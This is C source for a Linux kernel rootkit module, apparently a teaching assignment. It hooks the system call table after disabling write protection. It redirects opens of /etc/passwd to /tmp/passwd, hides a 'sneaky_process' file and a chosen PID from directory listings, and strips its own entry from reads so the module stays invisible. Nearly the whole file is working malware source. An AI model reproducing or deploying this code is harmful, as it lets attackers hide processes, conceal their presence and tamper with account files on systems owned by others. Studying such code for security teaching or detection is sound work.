#include <asm/cacheflush.h>
#include <asm/current.h> // process information
#include <asm/page.h>
#include <asm/unistd.h> // for system call constants
#include <linux/dirent.h>
#include <linux/highmem.h> // for changing page permissions
#include <linux/init.h>    // for entry/exit macros
#include <linux/kallsyms.h>
#include <linux/kernel.h> // for printk and other kernel bits
#include <linux/module.h> // for all modules
#include <linux/sched.h>

#define PREFIX "sneaky_process"

// Get the pid from parent
static char *pid = "";
module_param(pid, charp, 0);
MODULE_PARM_DESC(pid, "pid");

// This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr) {
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long)ptr, &level);
  if (pte->pte & ~_PAGE_RW) {
    pte->pte |= _PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr) {
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long)ptr, &level);
  pte->pte = pte->pte & ~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat'
// syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);
asmlinkage int (*original_getdents)(struct pt_regs *);
asmlinkage ssize_t (*original_read)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs) {
  // Implement the sneaky part here
  printk(KERN_INFO "Sneaky module openat.\n");

  // If path euqal to "/etc/passwd" then change
  if (strcmp((char *)regs->si, "/etc/passwd") == 0)
    copy_to_user((void *)(regs->si), "/tmp/passwd", 12);

  return (*original_openat)(regs);
}

// Change the dir list to ours
asmlinkage int sneaky_sys_getdents(struct pt_regs *regs) {

  printk(KERN_INFO "Sneaky module getdents.\n");

  // Get the total size of list data
  long nread = original_getdents(regs);

  if (nread == -1)
    return 0;

  // If nothing here, just return 0
  if (nread == 0)
    return 0;

  struct linux_dirent64 *d;

  // Ref: based on the given example code from
  // https://man7.org/linux/man-pages/man2/getdents.2.html

  long bpos;

  for (bpos = 0; bpos < nread;) {
    d = (struct linux_dirent64 *)(regs->si + bpos);

    // If we find our sneaky_process, delete it
    if (strcmp(d->d_name, "sneaky_process") == 0) {
      memmove(d, (void *)d + d->d_reclen, nread - bpos - d->d_reclen);
      nread -= d->d_reclen; // reduce nread
    }
    // if we find the our pid, delete it
    else if (strcmp(d->d_name, pid) == 0) {
      memmove(d, (void *)d + d->d_reclen, nread - bpos - d->d_reclen);
      nread -= d->d_reclen;
    } else {
      // update bpos
      bpos += d->d_reclen;
    }
  }

  return nread;
}

// Read sys call
asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {

  // Get the orginal read: ssize_t read(int fd, void *buf, size_t count)
  ssize_t nread = original_read(regs);
  void *buf = (void *)regs->si;
  printk(KERN_INFO "Sneaky module read.\n");

  if (nread <= 0) return 0;
  else {
    void *ptr = strnstr(buf, "sneaky_mod ", nread);
    if(ptr == NULL) return nread;
    else{
      int searchLen = nread - (ptr - buf);
      void *ptr_end = strnstr(ptr, "\n", searchLen);
      if(ptr_end == NULL) return nread;
      else{
          // decrease nread
          nread -= (ptr_end - ptr + 1);
          memmove(ptr, ptr_end + 1, nread + buf - ptr_end - 1);
      }
    }
  }
  return nread;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void) {
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];

  // Get original dir address
  original_getdents = (void *)sys_call_table[__NR_getdents64];

  // Get original read
  original_read = (void *)sys_call_table[__NR_read];

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;

  // You need to replace other system calls you need to hack here
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents;
  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0; // to show a successful load
}

static void exit_sneaky_module(void) {
  printk(KERN_INFO "Sneaky module being unloaded.\n");

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents;
  sys_call_table[__NR_read] = (unsigned long)original_read;
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);
}

module_init(initialize_sneaky_module); // what's called upon loading
module_exit(exit_sneaky_module);       // what's called upon unloading
MODULE_LICENSE("GPL");
